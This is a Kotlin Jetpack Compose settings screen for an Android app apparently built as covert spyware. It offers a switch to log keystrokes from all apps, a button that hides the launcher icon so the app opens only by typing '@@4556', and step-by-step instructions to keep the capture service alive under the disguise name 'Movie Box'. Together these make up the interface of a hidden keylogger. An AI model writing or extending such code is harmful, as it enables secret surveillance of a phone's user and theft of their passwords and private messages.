package com.example.memo.ui.screens

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.PowerManager
import android.provider.Settings
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SettingsScreen(
    isCapturing: Boolean,
    autoDeleteDays: Int,
    onBackClick: () -> Unit,
    onCapturingToggle: (Boolean) -> Unit,
    onAutoDeleteChanged: (Int) -> Unit,
    onClearAllData: () -> Unit
) {
    var showClearConfirmDialog by remember { mutableStateOf(false) }

    val autoDeleteOptions = listOf(0 to "Off", 30 to "30 days", 60 to "60 days", 90 to "90 days")
    var autoDeleteExpanded by remember { mutableStateOf(false) }
    val selectedLabel = autoDeleteOptions.find { it.first == autoDeleteDays }?.second ?: "Off"

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Settings") },
                navigationIcon = {
                    IconButton(onClick = onBackClick) {
                        Icon(Icons.Default.ArrowBack, contentDescription = "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.primaryContainer,
                    titleContentColor = MaterialTheme.colorScheme.onPrimaryContainer
                )
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .verticalScroll(rememberScrollState())
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // --- Capturing Toggle ---
            SettingSection(title = "Capture") {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column {
                        Text("Enable Capturing", style = MaterialTheme.typography.bodyLarge)
                        Text("Log keystrokes from all apps", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
                    }
                    Switch(checked = isCapturing, onCheckedChange = onCapturingToggle)
                }
            }

            // --- Auto-Delete ---
            SettingSection(title = "Auto-Delete") {
                Column {
                    Text("Delete entries older than", style = MaterialTheme.typography.bodyLarge)
                    Spacer(modifier = Modifier.height(8.dp))
                    ExposedDropdownMenuBox(
                        expanded = autoDeleteExpanded,
                        onExpandedChange = { autoDeleteExpanded = !autoDeleteExpanded }
                    ) {
                        OutlinedTextField(
                            value = selectedLabel,
                            onValueChange = {},
                            readOnly = true,
                            trailingIcon = { ExposedDropdownMenuDefaults.TrailingIcon(expanded = autoDeleteExpanded) },
                            modifier = Modifier.menuAnchor().fillMaxWidth()
                        )
                        ExposedDropdownMenu(
                            expanded = autoDeleteExpanded,
                            onDismissRequest = { autoDeleteExpanded = false }
                        ) {
                            autoDeleteOptions.forEach { (days, label) ->
                                DropdownMenuItem(
                                    text = { Text(label) },
                                    onClick = {
                                        onAutoDeleteChanged(days)
                                        autoDeleteExpanded = false
                                    }
                                )
                            }
                        }
                    }
                }
            }

            // --- App Visibility ---
            SettingSection(title = "App Visibility") {
                val context = LocalContext.current
                var isHidden by remember {
                    mutableStateOf(
                        context.packageManager.getComponentEnabledSetting(
                            android.content.ComponentName(context, "com.example.memo.LauncherAlias")
                        ) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                    )
                }

                Column {
                    Text("App Icon", style = MaterialTheme.typography.bodyLarge)
                    Text(
                        if (isHidden) "App is hidden. Open with @@4556 anywhere."
                        else "App icon is visible in launcher.",
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Button(
                        onClick = {
                            val p = context.packageManager
                            val componentName = android.content.ComponentName(context, "com.example.memo.LauncherAlias")
                            if (isHidden) {
                                p.setComponentEnabledSetting(
                                    componentName,
                                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                    android.content.pm.PackageManager.DONT_KILL_APP
                                )
                                isHidden = false
                            } else {
                                p.setComponentEnabledSetting(
                                    componentName,
                                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                    android.content.pm.PackageManager.DONT_KILL_APP
                                )
                                isHidden = true
                            }
                        },
                        modifier = Modifier.fillMaxWidth(),
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isHidden) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.secondary
                        )
                    ) {
                        Text(if (isHidden) "Restore App Icon" else "Hide App Icon Now")
                    }
                }
            }

            // --- Battery Optimization ---
            SettingSection(title = "Keep Service Alive") {
                val context = LocalContext.current
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                val isIgnoring = powerManager.isIgnoringBatteryOptimizations(context.packageName)

                Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
                    Text(
                        "⚠️ Phone aggressively kills background apps. Do ALL 4 steps:",
                        style = MaterialTheme.typography.bodyMedium,
                        color = MaterialTheme.colorScheme.error
                    )

                    // Step 1
                    Card(colors = CardDefaults.cardColors(
                        containerColor = MaterialTheme.colorScheme.surfaceVariant
                    )) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            Text("Step 1 — Battery Optimization", style = MaterialTheme.typography.labelLarge)
                            Spacer(modifier = Modifier.height(4.dp))
                            if (isIgnoring) {
                                Text("✅ Done — Battery optimization disabled", color = MaterialTheme.colorScheme.primary, style = MaterialTheme.typography.bodySmall)
                            } else {
                                Text("Tap below to disable battery optimization for this app.", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
                                Spacer(modifier = Modifier.height(8.dp))
                                Button(
                                    onClick = {
                                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                                        intent.data = Uri.parse("package:${context.packageName}")
                                        context.startActivity(intent)
                                    },
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Text("Disable Battery Optimization")
                                }
                            }
                        }
                    }

                    // Step 2
                    Card(colors = CardDefaults.cardColors(
                        containerColor = MaterialTheme.colorScheme.surfaceVariant
                    )) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            Text("Step 2 — Auto-Start Permission", style = MaterialTheme.typography.labelLarge)
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(
                                "Settings → App Management → Movie Box → Other Permissions → Allow Auto-Start → ON",
                                style = MaterialTheme.typography.bodySmall,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )
                        }
                    }

                    // Step 3
                    Card(colors = CardDefaults.cardColors(
                        containerColor = MaterialTheme.colorScheme.surfaceVariant
                    )) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            Text("Step 3 — Smart Freeze OFF", style = MaterialTheme.typography.labelLarge)
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(
                                "Settings → Battery → App Quick Freeze → find Movie Box → Remove from list (unfreeze it)",
                                style = MaterialTheme.typography.bodySmall,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )
                        }
                    }

                    // Step 4
                    Card(colors = CardDefaults.cardColors(
                        containerColor = MaterialTheme.colorScheme.surfaceVariant
                    )) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            Text("Step 4 — Lock App in Recents", style = MaterialTheme.typography.labelLarge)
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(
                                "Open Recents screen → Long-press on Movie Box card → tap the 🔒 Lock icon → This prevents Realme from clearing it",
                                style = MaterialTheme.typography.bodySmall,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )
                        }
                    }
                }
            }

            // --- Danger Zone ---
            SettingSection(title = "Danger Zone") {
                Button(
                    onClick = { showClearConfirmDialog = true },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error)
                ) {
                    Text("Clear All Captured Data", color = Color.White)
                }
            }
        }
    }

    // --- Confirm Clear All Dialog ---
    if (showClearConfirmDialog) {
        AlertDialog(
            onDismissRequest = { showClearConfirmDialog = false },
            title = { Text("Clear All Data?") },
            text = { Text("This will permanently delete ALL captured entries. This action cannot be undone.") },
            confirmButton = {
                TextButton(onClick = {
                    onClearAllData()
                    showClearConfirmDialog = false
                }) {
                    Text("Delete Everything", color = MaterialTheme.colorScheme.error)
                }
            },
            dismissButton = {
                TextButton(onClick = { showClearConfirmDialog = false }) { Text("Cancel") }
            }
        )
    }
}

@Composable
fun SettingSection(title: String, content: @Composable () -> Unit) {
    Card(modifier = Modifier.fillMaxWidth()) {
        Column(modifier = Modifier.padding(16.dp)) {
            Text(
                text = title.uppercase(),
                style = MaterialTheme.typography.labelSmall,
                color = MaterialTheme.colorScheme.primary
            )
            Spacer(modifier = Modifier.height(12.dp))
            content()
        }
    }
}
